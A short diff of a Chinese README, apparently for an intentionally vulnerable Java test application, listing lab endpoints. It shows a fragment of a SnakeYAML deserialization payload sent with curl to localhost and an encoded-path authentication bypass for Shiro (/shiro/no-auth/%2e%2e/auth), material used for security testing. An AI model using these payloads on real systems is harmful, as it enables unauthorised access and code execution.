@@ -213,7 +213,8 @@ curl 127.0.0.1:8080/snakeyaml/parse -d 'yaml=!!javax.script.ScriptEngineManager 
 
 ### 其他接口
 
-1. 测试/actuator接口
+1. 测试 /actuator 接口
 2. 测试 alwaysUseFullPath 认证绕过漏洞: http://rui0.cn/archives/1643
    * 直接访问 /shiro/auth 会提示认证失败
    * 使用 /shiro/no-auth/%2e%2e/auth 可以绕过认证
+3. websocket测试接口 /ws
